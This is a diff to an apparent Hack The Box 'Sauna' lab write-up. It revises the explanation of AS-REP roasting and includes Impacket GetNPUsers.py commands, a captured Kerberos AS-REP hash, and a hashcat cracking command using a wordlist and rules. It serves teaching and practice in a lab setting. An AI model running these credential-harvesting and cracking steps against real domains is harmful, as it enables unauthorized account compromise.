@@ -298,7 +298,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3c53fdc02c13d7071e54869b72df81c6$1cc
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
-This returns a hash, which means a valid user "fsmith" has been found.  
+This returns an encrypted AS_REP message, which means a valid user "fsmith" has been found with pre-authentication not required.  
 Export the hash in a crackable format for hashcat:
 ```bash
 kali@kali:/usr/share/doc/python3-impacket/examples$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.175 -no-pass -usersfile ~/Desktop/htb/sauna/users.txt 'egotistical-bank.local/' -format hashcat
@@ -311,9 +311,9 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5d5341f5b03c798337e1a84caaaac932$c4c
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
 
-### 4. Crack the hash
+### 4. Crack the message
 ```bash
-kali@kali:~/Desktop/htb/sauna$ hashcat -a 0 -m 18200 fsmith_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
+kali@kali:~/Desktop/htb/sauna$ hashcat -a 0 -m 18200 fsmith_aesrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
 hashcat (v6.0.0) starting...
 
 You have enabled --force to bypass dangerous warnings and errors!
